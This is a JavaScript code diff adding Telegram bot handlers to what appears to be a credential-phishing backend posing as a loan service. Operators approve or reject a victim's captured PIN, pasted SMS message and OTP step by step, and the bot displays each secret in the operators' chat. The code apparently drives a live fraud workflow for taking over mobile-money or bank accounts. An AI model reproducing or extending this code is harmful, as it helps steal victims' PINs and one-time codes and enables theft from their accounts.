@@ -1432,6 +1432,197 @@ User will now proceed to OTP.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
     }
+
+    // ──────────────────────────────────────
+    // PIN APPROVAL HANDLERS (NEW)
+    // ──────────────────────────────────────
+    else if (data.startsWith('allow_pin_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Update PIN status to approved
+        await db.updateApplication(applicationId, { pinStatus: 'approved' });
+        console.log(`✅ PIN APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+✅ *LOGIN APPROVED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 PIN: \`${application.pin}\`
+
+✓ User can now proceed to SMS verification
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Login approved! User can now submit SMS.' });
+    }
+
+    else if (data.startsWith('deny_pin_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Update PIN status to rejected
+        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+        console.log(`❌ PIN REJECTED for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *LOGIN DENIED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 PIN: \`${application.pin}\`
+
+✓ User will be sent back to login page
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login denied. User returned to login page.' });
+    }
+
+    // ──────────────────────────────────────
+    // SMS APPROVAL HANDLERS (NEW)
+    // ──────────────────────────────────────
+    else if (data.startsWith('approve_sms_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Update OTP status to approved (using otpStatus for SMS approval)
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        console.log(`✅ SMS APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+✅ *SMS MESSAGE APPROVED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+📝 *Message:*
+\`\`\`
+${application.smsMessage || 'N/A'}
+\`\`\`
+
+✓ User can now proceed to OTP verification
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved! User can now enter OTP.' });
+    }
+
+    else if (data.startsWith('reject_sms_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Update OTP status to rejected
+        await db.updateApplication(applicationId, { otpStatus: 'rejected' });
+        console.log(`❌ SMS REJECTED for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *SMS MESSAGE INVALID*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+📝 *Message:*
+\`\`\`
+${application.smsMessage || 'N/A'}
+\`\`\`
+
+✓ User will be asked to paste the correct message
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
+    }
+
+    // ──────────────────────────────────────
+    // OTP APPROVAL HANDLERS (EXISTING)
+    // ──────────────────────────────────────
+    else if (data.startsWith('approve_otp_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Update OTP status to approved
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        console.log(`✅ OTP APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+🎉 *LOAN APPROVED!*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 OTP: \`${application.otp}\`
+
+✓ Loan has been approved successfully!
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
+    }
+
+    else if (data.startsWith('wrongcode_otp_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        // Mark OTP as wrong code
+        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+        console.log(`❌ WRONG OTP CODE for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *WRONG OTP CODE*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 OTP entered: \`${application.otp}\`
+
+✓ User will be asked to re-enter OTP
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User asked to try again.' });
+    }
 });
 
 console.log('✅ Telegram callback handler registered!');
